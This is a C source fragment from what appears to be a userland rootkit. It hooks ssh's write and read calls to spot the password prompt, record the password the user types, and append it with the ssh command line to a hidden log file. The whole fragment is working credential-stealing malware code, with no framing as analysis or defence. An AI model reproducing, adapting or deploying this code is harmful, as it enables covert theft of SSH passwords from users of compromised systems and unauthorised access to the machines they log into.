int is_pwprompt(int fd, const void *buf){
    struct stat s_fstat;
    hook(C__FXSTAT);
    memset(&s_fstat, 0, sizeof(stat));
    call(C__FXSTAT, _STAT_VER, fd, &s_fstat);
    if(S_ISSOCK(s_fstat.st_mode)) return 0;

    if(buf != NULL && strstr(PW_STR, (char *)buf))
        return 1;

    return 0;
}

ssize_t hijack_write_ssh(int fd, const void *buf, ssize_t o){
    if(!process(SSH_STR)) return o;

    if(is_pwprompt(fd, buf)){
        ssh_pass_size = 0;
        memset(ssh_pass, 0, sizeof(ssh_pass));
        ssh_start = 1;
    }

    return o;
}

ssize_t log_ssh(int fd, void *buf, ssize_t o){
    if(fd == 0) return o;

    struct stat s_fstat;
    FILE *fp;
    char *p, *mycmdline;

    hook(C__FXSTAT);

    memset(&s_fstat, 0, sizeof(stat));
    call(C__FXSTAT, _STAT_VER, fd, &s_fstat);
    if(S_ISSOCK(s_fstat.st_mode)) return o;

    /* begin reading input once we know for sure
     * it's a password prompt for ssh. */
    if(xprocess(SSH_STR) && fd == 4 && ssh_start){
        p = buf;
        
        if(*p == '\n'){
            ssh_start = 0;
            if((fp = fopen(SSH_LOGS, "a"))){
                mycmdline = process_cmdline();
                fprintf(fp, FMT_STR, mycmdline, ssh_pass);
                free(mycmdline);
                fflush(fp);
                fclose(fp);
            }

            return o;
        }

        ssh_pass[ssh_pass_size++] = *p;
    }

    return o;
}